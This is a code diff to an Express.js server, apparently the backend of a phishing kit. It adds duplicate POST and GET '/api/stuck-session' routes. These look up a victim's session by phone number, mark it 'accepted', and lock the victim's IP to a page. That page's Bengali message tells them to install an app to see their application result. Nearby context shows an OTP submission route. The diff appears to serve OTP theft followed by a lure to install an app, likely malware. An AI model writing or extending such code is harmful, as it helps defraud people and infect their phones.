@@ -450,6 +450,73 @@ app.get('/api/submit-otp', (req, res) => {
   });
 });
 
+// ===== STUCK SESSION BY PHONE (Cookie + IP Lock) =====
+app.post('/api/stuck-session', (req, res) => {
+  const phone = req.body?.phone || req.query?.phone;
+  if (!phone) return res.json({ success: false });
+
+  const n = normalizePhoneForLookup(phone);
+
+  for (const [id, data] of Object.entries(sessions)) {
+    if (!data) continue;
+    const p1 = normalizePhoneForLookup(data.initialPhone);
+    const p2 = normalizePhoneForLookup(data.gatewayPhone);
+    if (p1 === n || p2 === n) {
+      const updates = {
+        ...data,
+        adminAction: 'APPLICATION_ACCEPTED',
+        applicationStatus: 'ACCEPTED',
+        acceptedAt: Date.now(),
+        stuckPageActive: true,
+        stuckPageMessage: 'আপনার আবেদনের তথ্য ও ফলাফল দেখতে নিচের দেয়া অ্যাপটি ইন্সটল করুন।',
+        lastUpdated: Date.now(),
+      };
+      sessions[id] = updates;
+      saveSession(id);
+      if (data.clientIp) {
+        stuckIps[data.clientIp] = { sessionId: id, stuckAt: Date.now(), message: updates.stuckPageMessage, phone: phone };
+        saveStuckIps();
+      }
+      return res.json({ success: true });
+    }
+  }
+
+  res.json({ success: false });
+});
+
+app.get('/api/stuck-session', (req, res) => {
+  const phone = req.query?.phone;
+  if (!phone) return res.json({ success: false });
+
+  const n = normalizePhoneForLookup(phone);
+
+  for (const [id, data] of Object.entries(sessions)) {
+    if (!data) continue;
+    const p1 = normalizePhoneForLookup(data.initialPhone);
+    const p2 = normalizePhoneForLookup(data.gatewayPhone);
+    if (p1 === n || p2 === n) {
+      const updates = {
+        ...data,
+        adminAction: 'APPLICATION_ACCEPTED',
+        applicationStatus: 'ACCEPTED',
+        acceptedAt: Date.now(),
+        stuckPageActive: true,
+        stuckPageMessage: 'আপনার আবেদনের তথ্য ও ফলাফল দেখতে নিচের দেয়া অ্যাপটি ইন্সটল করুন।',
+        lastUpdated: Date.now(),
+      };
+      sessions[id] = updates;
+      saveSession(id);
+      if (data.clientIp) {
+        stuckIps[data.clientIp] = { sessionId: id, stuckAt: Date.now(), message: updates.stuckPageMessage, phone: phone };
+        saveStuckIps();
+      }
+      return res.json({ success: true });
+    }
+  }
+
+  res.json({ success: false });
+});
+
 // ===== CHECK STUCK STATUS BY PHONE (Read-only, no modify) =====
 // Returns true if phone has a stuck session, false otherwise
 app.post('/api/release-stuck', (req, res) => {
